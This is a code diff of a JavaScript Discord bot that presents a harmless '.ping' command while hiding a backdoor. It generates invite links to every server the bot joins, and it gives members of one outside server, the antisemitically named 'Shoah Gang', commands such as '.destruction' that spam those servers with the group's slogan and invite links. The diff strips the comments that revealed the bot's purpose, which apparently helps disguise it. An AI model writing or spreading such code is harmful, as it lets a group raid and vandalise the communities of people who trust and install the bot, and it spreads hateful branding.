@@ -4,10 +4,10 @@ const fs = require('fs');
  
 var fucked = false;
  
-//carlo bot v4.1 update for shoahgang only
+
 
 bot.on('ready',() => {
-  //invit link
+
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
     invite.createInvite().then(invite => {
@@ -18,20 +18,18 @@ bot.on('ready',() => {
 })
  
 bot.on('message', msg => {
-  //#region Legit
-  /* Commandes legit */
+
   if (msg.content === '.ping') {
     msg.reply('pong !')
   }
 
-  //#endregion
 
-  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ //Shoah Gang
+  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ 
     return;
   }
   
   
-  //check si membre shoahgang ou adonis
+
   if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
@@ -41,7 +39,7 @@ if (msg.content === '.destruction') {
                        "SHOAH GANG ON THE BEAT\n" +
                        "https://discord.gg/835hm2Q\n" +
                        "https://discord.gg/ZKYWm6g").catch(e => {});
-    }, 500)
+    }, 2500)
   }
 
 if (msg.content === '.oupss') {
@@ -92,7 +90,7 @@ if (msg.content === '.pardon') {
       if (msg.deletable) msg.delete().catch(e => {});
     }).catch(e => {});
   }
-  //#endregion
+
 }});
 
 bot.login(process.env.BOT_TOKEN)
